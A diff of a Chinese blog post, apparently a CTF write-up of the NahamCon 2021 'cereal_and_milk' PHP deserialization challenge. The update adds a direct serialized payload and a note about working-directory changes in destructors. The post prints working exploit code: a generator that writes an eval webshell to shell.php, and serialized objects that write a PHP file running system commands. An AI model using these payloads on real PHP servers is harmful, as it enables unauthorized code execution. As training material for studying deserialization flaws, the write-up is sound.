@@ -23,20 +23,20 @@
     var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Nahamcon-2021-cereal_and_milk题目代码不难，但是wp的这句话吸引了我Now another quirk, do not copy the last &amp;#125;，不去复制exp生成序列化字符串的最后一个&amp;#125;才能写马成功，遂来复现 源码index.php12345678910111213141516171819202122232425262728293031&amp;lt">
+  <meta name="description" content="Nahamcon-2021-cereal_and_milk题目代码不难，但是wp的这句话吸引了我Now another quirk, do not copy the last &amp;#125;，不去复制exp生成序列化字符串的最后一个&amp;#125;才能写马成功，遂来复现 补(3.18)：经@feng师傅提醒，直接使用O:3:&quot;log&quot;:2:&amp;#123;s:4:&quot;logs&amp;q">
 <meta property="og:type" content="article">
 <meta property="og:title" content="由Nahamcon-2021-cereal_and_milk看php反序列化">
 <meta property="og:url" content="http://yq1ng.github.io/z_post/%E7%94%B1Nahamcon-2021-cereal-and-milk%E7%9C%8Bphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="会下雪的晴天">
-<meta property="og:description" content="Nahamcon-2021-cereal_and_milk题目代码不难，但是wp的这句话吸引了我Now another quirk, do not copy the last &amp;#125;，不去复制exp生成序列化字符串的最后一个&amp;#125;才能写马成功，遂来复现 源码index.php12345678910111213141516171819202122232425262728293031&amp;lt">
+<meta property="og:description" content="Nahamcon-2021-cereal_and_milk题目代码不难，但是wp的这句话吸引了我Now another quirk, do not copy the last &amp;#125;，不去复制exp生成序列化字符串的最后一个&amp;#125;才能写马成功，遂来复现 补(3.18)：经@feng师傅提醒，直接使用O:3:&quot;log&quot;:2:&amp;#123;s:4:&quot;logs&amp;q">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yq1ng.github.io/z_post/%E7%94%B1Nahamcon-2021-cereal-and-milk%E7%9C%8Bphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%94%B1Nahamcon-2021-cereal-and-milk%E7%9C%8Bphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image.98paqm3rwxk.png">
-<meta property="og:image" content="http://yq1ng.github.io/z_post/%E7%94%B1Nahamcon-2021-cereal-and-milk%E7%9C%8Bphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%94%B1Nahamcon-2021-cereal-and-milk%E7%9C%8Bphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image.sqzjqy0tix.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210318154541.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210318154550.png">
 <meta property="article:published_time" content="2021-03-16T07:17:53.000Z">
-<meta property="article:modified_time" content="2021-03-16T08:47:50.605Z">
+<meta property="article:modified_time" content="2021-03-18T10:57:23.814Z">
 <meta property="article:author" content="yq1ng">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yq1ng.github.io/z_post/%E7%94%B1Nahamcon-2021-cereal-and-milk%E7%9C%8Bphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%94%B1Nahamcon-2021-cereal-and-milk%E7%9C%8Bphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image.98paqm3rwxk.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210318154541.png">
 
 <link rel="canonical" href="http://yq1ng.github.io/z_post/%E7%94%B1Nahamcon-2021-cereal-and-milk%E7%9C%8Bphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
@@ -208,10 +208,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-03-16 15:17:53 / 修改时间：16:47:50" itemprop="dateCreated datePublished" datetime="2021-03-16T15:17:53+08:00">2021-03-16</time>
+              <time title="创建时间：2021-03-16 15:17:53" itemprop="dateCreated datePublished" datetime="2021-03-16T15:17:53+08:00">2021-03-16</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-18 18:57:23" itemprop="dateModified" datetime="2021-03-18T18:57:23+08:00">2021-03-18</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -235,14 +241,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.3k</span>
+              <span>3.9k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
+              <span>6 分钟</span>
             </span>
 
         </div>
@@ -255,6 +261,11 @@
 
       
         <h1 id="Nahamcon-2021-cereal-and-milk"><a href="#Nahamcon-2021-cereal-and-milk" class="headerlink" title="Nahamcon-2021-cereal_and_milk"></a>Nahamcon-2021-cereal_and_milk</h1><p>题目代码不难，但是wp的这句话吸引了我<code>Now another quirk, do not copy the last &#125;</code>，不去复制exp生成序列化字符串的最后一个<code>&#125;</code>才能写马成功，遂来复现</p>
+<p>补(3.18)：经@feng师傅提醒，直接使用<code>O:3:&quot;log&quot;:2:&#123;s:4:&quot;logs&quot;;s:7:&quot;pwn.php&quot;;s:7:&quot;request&quot;;s:1:&quot;a&quot;;&#125;</code>一样可以触发log，debug确实写入成功，但是本目录下未生成马。查资料发现由于apache的原因，析构函数会被其改变工作目录，马被写到php根目录下，本机是<code>D:\Software\phpstudy_pro\Extensions\php\php7.3.4nts</code>，本题做法是提前进入了析构函数，所以目录未变，当然如果知道绝对路径可以直接写，例如：<code>O:3:&quot;log&quot;:2:&#123;s:4:&quot;logs&quot;;s:52:&quot;D:\Software\phpstudy_pro\WWW\cereal_and_milk\pwn.php&quot;;s:7:&quot;request&quot;;s:27:&quot;&lt;?php system(&quot;ls -l .&quot;); ?&gt;&quot;;&#125;</code>。  </p>
+<p>附上官方对析构函数的Note:  </p>
+<p>析构函数在脚本关闭时调用，此时所有的HTTP头信息已经发出。 脚本关闭时的工作目录有可能和在SAPI(如apache)中时不一样。 </p>
+<a id="more"></a>
+
 <h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;log.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CerealAndMilk</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $logs = <span class="string">&quot;request-logs.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $request = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $cereal = <span class="string">&#x27;Captain Crunch&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $milk = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">processed_data</span>(<span class="params">$output</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Deserilized data:&lt;br&gt; Coming soon.&quot;</span>;</span><br><span class="line">       <span class="comment"># echo print_r($output);</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cereal_and_milk</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;cereal . <span class="string">&quot; is the best cereal btw.&quot;</span>;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input = $_POST[<span class="string">&#x27;serdata&#x27;</span>];</span><br><span class="line">$output = unserialize($input);</span><br><span class="line"></span><br><span class="line">$app = <span class="keyword">new</span> CerealAndMilk;</span><br><span class="line">$app -&gt; cereal_and_milk($output);</span><br></pre></td></tr></table></figure>
 
 <h3 id="log-php"><a href="#log-php" class="headerlink" title="log.php"></a>log.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $request_log = fopen(<span class="keyword">$this</span>-&gt;logs , <span class="string">&quot;a&quot;</span>);</span><br><span class="line">            fwrite($request_log, <span class="keyword">$this</span>-&gt;request);</span><br><span class="line">            fwrite($request_log, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            fclose($request_log);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -264,13 +275,13 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;log.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CerealAndMilk</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $logs = <span class="string">&quot;request-logs.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $request = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;logs = <span class="string">&quot;shell.php&quot;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;request = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;yq1ng&quot;]);?&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> CerealAndMilk());</span><br></pre></td></tr></table></figure>
 
 <p>丢到输入框里面试试，post一下并没有生成马子，debug可以看到数据被成功反序列化了，并没有触发到log类</p>
-<p><img src="%E7%94%B1Nahamcon-2021-cereal-and-milk%E7%9C%8Bphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image.98paqm3rwxk.png" alt="debug"></p>
-<p>这样的反序列化的确是我第一次见，看了官方wp才知道原来可以利用数组去触发，多说无益，看代码</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210318154541.png" alt="debug"></p>
+<p>这样的反序列化的确是我第一次见，看了wp才知道原来可以利用数组去触发，多说无益，看代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logs = <span class="string">&#x27;pwn.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;request = <span class="string">&#x27;&lt;?php system(&quot;ls -l .&quot;); ?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CerealAndMilk</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $logs = <span class="string">&quot;request-logs.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $request = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $cereal = <span class="string">&#x27;Captain Crunch&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $milk = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log[<span class="number">0</span>] = <span class="keyword">new</span> log();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cereal[<span class="number">0</span>] = <span class="string">&#x27;Frosties&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;milk[<span class="number">0</span>] = <span class="string">&#x27;full&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log[<span class="number">1</span>] = <span class="keyword">new</span> log();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cereal[<span class="number">1</span>] = <span class="string">&#x27;Frosties&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;milk[<span class="number">1</span>] = <span class="string">&#x27;full&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cer = <span class="keyword">new</span> CerealAndMilk();</span><br><span class="line"><span class="keyword">echo</span> serialize($cer);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">output</span></span><br><span class="line"><span class="comment">O:13:&quot;CerealAndMilk&quot;:5:&#123;s:4:&quot;logs&quot;;s:16:&quot;request-logs.txt&quot;;s:7:&quot;request&quot;;s:0:&quot;&quot;;s:6:&quot;cereal&quot;;s:14:&quot;FFptain Crunch&quot;;s:4:&quot;milk&quot;;s:2:&quot;ff&quot;;s:3:&quot;log&quot;;a:2:&#123;i:0;O:3:&quot;log&quot;:2:&#123;s:4:&quot;logs&quot;;s:7:&quot;pwn.php&quot;;s:7:&quot;request&quot;;s:27:&quot;&lt;?php system(&quot;ls -l .&quot;); ?&gt;&quot;;&#125;i:1;O:3:&quot;log&quot;:2:&#123;s:4:&quot;logs&quot;;s:7:&quot;pwn.php&quot;;s:7:&quot;request&quot;;s:27:&quot;&lt;?php system(&quot;ls -l .&quot;); ?&gt;&quot;;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
 
 <p>不要复制最后一个<code>&#125;</code>，这样会导致反序列化成功，还是不能触发log。如果不复制最后一个<code>&#125;</code>的话，在反序列化的时候</p>
 <p><code>s:4:&quot;logs&quot;;s:16:&quot;request-logs.txt&quot;;s:7:&quot;request&quot;;s:0:&quot;&quot;;s:6:&quot;cereal&quot;;s:14:&quot;FFptain Crunch&quot;;s:4:&quot;milk&quot;;s:2:&quot;ff&quot;;</code>这一段可以反序列化成功，但是由于反序列化数组<code>s:3:&quot;log&quot;;a:2:</code>的时候，最后少了一个<code>&#125;</code>导致数组不能成功反序列化，这会让php继续读取后面的字符串，看是否还有可以反序列化的点，最后返回false。说白了就是反序列化的套娃，前面不成功不影响后面的</p>
-<p><img src="%E7%94%B1Nahamcon-2021-cereal-and-milk%E7%9C%8Bphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image.sqzjqy0tix.png" alt="pwn"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210318154550.png" alt="pwn"></p>
 <p>可以看到成功触发了log，并生成了pwn.php，整个题目就是这样了</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>套娃反序列化，PHP is the best language in the world</p>
 
@@ -328,7 +339,10 @@
     <a href="/z_post/F5%E6%9D%AF%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/" rel="prev" title="ctfshow F5杯web（复现）">
       <i class="fa fa-chevron-left"></i> ctfshow F5杯web（复现）
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/z_post/%E7%94%B1-RCTF-2019-Nextphp%E5%AD%A6%E4%B9%A0phpinfo%E4%B8%AD%E7%9A%84i%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8F%8APHP7-4%E6%96%B0%E7%89%B9%E6%80%A7-FFI/" rel="next" title="由[RCTF 2019]Nextphp学习phpinfo中的i信息收集及PHP7.4新特性-FFI">
+      由[RCTF 2019]Nextphp学习phpinfo中的i信息收集及PHP7.4新特性-FFI <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -403,7 +417,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-count">60</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -504,13 +518,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">333k</span>
+    <span title="站点总字数">338k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">9:15</span>
+    <span title="站点阅读时长">9:24</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
